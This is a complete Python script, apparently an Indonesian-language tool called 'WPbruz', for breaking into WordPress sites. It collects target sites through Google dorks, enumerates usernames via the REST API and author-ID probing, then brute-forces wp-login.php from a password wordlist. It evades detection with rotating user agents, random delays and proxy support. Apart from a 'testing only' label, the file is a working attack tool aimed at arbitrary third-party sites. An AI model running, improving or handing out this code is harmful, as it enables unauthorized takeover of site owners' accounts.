#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import os
import sys
import argparse
import logging
import random
import time
import platform
import subprocess

from pathlib import Path
from typing import List, Optional, Tuple

# ──────────────────────────────────────────────────────────────────────────────
# OPTIONAL DEPENDENCY: googlesearch
# pip install googlesearch-python
# ──────────────────────────────────────────────────────────────────────────────
try:
    from googlesearch import search
except ImportError:
    search = None

# ──────────────────────────────────────────────────────────────────────────────
#  Terminal Color Codes
# ──────────────────────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

# ──────────────────────────────────────────────────────────────────────────────
#  ASCII Art Header
# ──────────────────────────────────────────────────────────────────────────────
ASCII_ART = f"""
{GREEN}
 █     █░ ██▓███   ▄▄▄▄    ██▀███   █    ██ ▒███████▒
▓█░ █ ░█░▓██░  ██▒▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▒ ▒ ▒ ▄▀░
▒█░ █ ░█ ▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░░ ▒ ▄▀▒░ 
░█░ █ ░█ ▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░  ▄▀▒   ░
░░██▒██▓ ▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓ ▒███████▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒
  ▒ ░ ░  ░▒ ░     ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒
  ░   ░  ░░        ░    ░   ░░   ░  ░░░ ░ ░ ░ ░ ░ ░ ░
    ░              ░         ░        ░       ░ ░    
                        ░                   ░        
{RESET}

{CYAN}WHITE HACKER{RESET}
"""

# ──────────────────────────────────────────────────────────────────────────────
#  Some common User-Agent strings to rotate
# ──────────────────────────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/115.0.0.0 Safari/537.36",
]

def clear_screen():
    """Clear terminal screen, cross-platform."""
    cmd = "cls" if platform.system() == "Windows" else "clear"
    subprocess.call(cmd, shell=True)

def setup_logging(log_file: Optional[Path] = None, debug: bool = False):
    """Configure logging to console and optional file."""
    level = logging.DEBUG if debug else logging.INFO
    handlers = [logging.StreamHandler(sys.stdout)]
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding="utf-8"))
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=handlers,
    )

def find_targets_from_dork(dork: str, limit: int) -> List[str]:
    if search is None:
        logging.error("Module googlesearch belum terinstall. pip install googlesearch-python")
        sys.exit(1)
    logging.info("Mencari target via Google dork: '%s' (max %d)", dork, limit)
    results: List[str] = []
    for url in search(dork, limit):
        time.sleep(1)
        m = re.match(r"https?://[^/]+", url)
        if m:
            root = m.group(0)
            if root not in results:
                results.append(root)
    logging.info("Ditemukan %d target", len(results))
    return results

def get_usernames(target_url: str, timeout: float) -> List[str]:
    users: List[str] = []
    api_url = f"{target_url.rstrip('/')}/wp-json/wp/v2/users"
    logging.info("[%s] Mencoba REST API: %s", target_url, api_url)
    try:
        resp = requests.get(api_url, timeout=timeout,
                            headers={"User-Agent": random.choice(USER_AGENTS)})
        if resp.status_code == 200:
            for u in resp.json():
                slug = u.get("slug")
                if slug: users.append(slug)
            logging.info("Ditemukan %d user lewat REST API", len(users))
            return users
    except Exception:
        pass
    logging.info("Fallback author enumeration...")
    for i in range(1, 11):
        try:
            resp = requests.get(f"{target_url.rstrip('/')}/?author={i}",
                                timeout=timeout, allow_redirects=True,
                                headers={"User-Agent": random.choice(USER_AGENTS)})
            if resp.status_code == 200:
                m = re.search(r"/author/([^/]+)/?", resp.url)
                if m and m.group(1) not in users:
                    users.append(m.group(1))
        except Exception:
            continue
    logging.info("Ditemukan %d user lewat enumeration", len(users))
    return users

def pilih_username(usernames: List[str]) -> Optional[str]:
    if not usernames:
        logging.error("Tidak ada username ditemukan.")
        return None
    print()
    logging.info("Username yang ditemukan:")
    for idx, name in enumerate(usernames, start=1):
        print(f"   [{idx}] {name}")
    while True:
        try:
            c = int(input(f"{YELLOW}[?] Pilih nomor username: {RESET}"))
            if 1 <= c <= len(usernames):
                return usernames[c-1]
        except ValueError:
            pass
        logging.warning("Pilihan tidak valid, coba lagi.")

def bruteforce_wp(
    target_url: str,
    username: str,
    passwords: List[str],
    timeout: float,
    delay_range: Tuple[float, float],
    resume_file: Optional[Path],
    proxy: Optional[str]
) -> Optional[str]:
    login_url = f"{target_url.rstrip('/')}/wp-login.php"
    session = requests.Session()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    total = len(passwords)
    start = 0
    if resume_file and resume_file.exists():
        val = int(resume_file.read_text().strip() or "0")
        if val >= total:
            resume_file.unlink()
            logging.info("Resume-file melebihi wordlist, reset ke 0")
        else:
            start = val
            logging.info("Melanjutkan dari password ke-%d", start)
    try:
        for idx in range(start, total):
            pwd = passwords[idx]
            print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} {target_url} ▶ {username}:{pwd}", end="", flush=True)
            time.sleep(random.uniform(delay_range[0], delay_range[1]))
            try:
                resp = session.post(
                    login_url, data={"log":username,"pwd":pwd,"wp-submit":"Log In",
                    "redirect_to":f"{target_url.rstrip('/')}/wp-admin/","testcookie":"1"},
                    timeout=timeout, allow_redirects=True,
                    headers={"User-Agent": random.choice(USER_AGENTS)},
                    proxies=proxies
                )
            except Exception as e:
                logging.warning("Request gagal: %s", e)
                continue
            if "wordpress_logged_in" in session.cookies.get_dict() or "/wp-admin/" in resp.url:
                print()
                logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
                if resume_file and resume_file.exists(): resume_file.unlink()
                return pwd
            if resume_file: resume_file.write_text(str(idx+1))
    except KeyboardInterrupt:
        print()
        if resume_file and resume_file.exists(): resume_file.unlink()
        logging.warning("🚫 Dihentikan user, resume-file dihapus.")
        sys.exit(1)
    print()
    if resume_file and resume_file.exists(): resume_file.unlink()
    logging.error("Tidak ada password cocok untuk %s di %s", username, target_url)
    return None

def main():
    clear_screen()
    print(ASCII_ART)

    p = argparse.ArgumentParser(description="WPbruz — Brute-force WordPress (testing only)")
    p.add_argument("target", help="URL target (ignored if --dork dipakai)")
    p.add_argument("wordlist", help="Path ke file password list")
    p.add_argument("--username", help="Username WordPress (jika sudah tahu)")
    p.add_argument("--timeout",  type=float, default=10.0, help="Timeout request (detik)")
    p.add_argument("--delay",    type=float, nargs=2, metavar=("MIN","MAX"), default=(1.0,3.0),
                   help="Jeda acak antar request (detik)")
    p.add_argument("--proxy",    help="Proxy (socks5://host:port atau http://host:port)")
    p.add_argument("--resume-file", default=".wpbruz_resume",
                   help="File checkpoint resume per run")
    p.add_argument("--log-file", help="Simpan log ke file")
    p.add_argument("--debug",     action="store_true", help="Debug output (HTTP details)")
    p.add_argument("--dork",      help="Google Dork (inurl:wp-login.php site:...)")
    p.add_argument("--limit",     type=int, default=15, help="Maks hasil Google dork")
    args = p.parse_args()

    setup_logging(Path(args.log_file) if args.log_file else None, args.debug)

    if args.dork:
        targets = find_targets_from_dork(args.dork, args.limit)
    else:
        targets = [args.target.rstrip('/')]

    try:
        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            pwds = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        logging.error("File wordlist tidak ditemukan: %s", args.wordlist)
        sys.exit(1)

    for tgt in targets:
        logging.info("=== Memproses target: %s ===", tgt)

        # Skip jika wp-login.php tidak ada / timeout cepat
        login_url = f"{tgt.rstrip('/')}/wp-login.php"
        try:
            h = requests.head(login_url, timeout=5,
                              headers={"User-Agent": random.choice(USER_AGENTS)})
            if h.status_code != 200:
                logging.warning("Skip %s, wp-login.php tidak ditemukan (status %d)", tgt, h.status_code)
                continue
        except Exception:
            logging.warning("Skip %s, tidak bisa konek ke wp-login.php", tgt)
            continue

        if args.username:
            user = args.username
        else:
            users = get_usernames(tgt, args.timeout)
            if not users:
                logging.warning("Skip %s, tidak ada user ditemukan.", tgt)
                continue
            user = pilih_username(users)
            if not user:
                logging.warning("Skip %s, user tidak dipilih.", tgt)
                continue

        logging.info("Mulai brute-force %s di %s (%d pwd)", user, tgt, len(pwds))
        found = bruteforce_wp(
            target_url  = tgt,
            username    = user,
            passwords   = pwds,
            timeout     = args.timeout,
            delay_range = (args.delay[0], args.delay[1]),
            resume_file = Path(args.resume_file),
            proxy       = args.proxy,
        )
        if found:
            logging.info("=> Sukses di %s: %s / %s", tgt, user, found)
        else:
            logging.warning("=> Gagal di %s", tgt)

    logging.info("=== Semua target selesai ===")

if __name__ == "__main__":
    main()
